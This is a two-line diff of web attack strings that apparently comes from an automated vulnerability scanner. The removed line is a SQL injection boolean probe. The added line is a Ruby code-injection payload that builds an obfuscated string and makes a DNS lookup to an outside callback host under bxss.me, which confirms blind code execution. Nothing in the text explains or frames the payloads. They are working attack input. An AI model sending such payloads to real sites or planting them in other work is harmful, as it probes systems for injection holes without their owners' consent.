@@ -1,1 +1,2 @@
--1" OR 2+121-121-1=0+0+0+1 -- 
+"+"A".concat(70-3).concat(22*4).concat(114).concat(88).concat(108).concat(67)+(require"socket"
+Socket.gethostbyname("hitjj"+"qxexaatma7721.bxss.me.")[3].to_s)+"
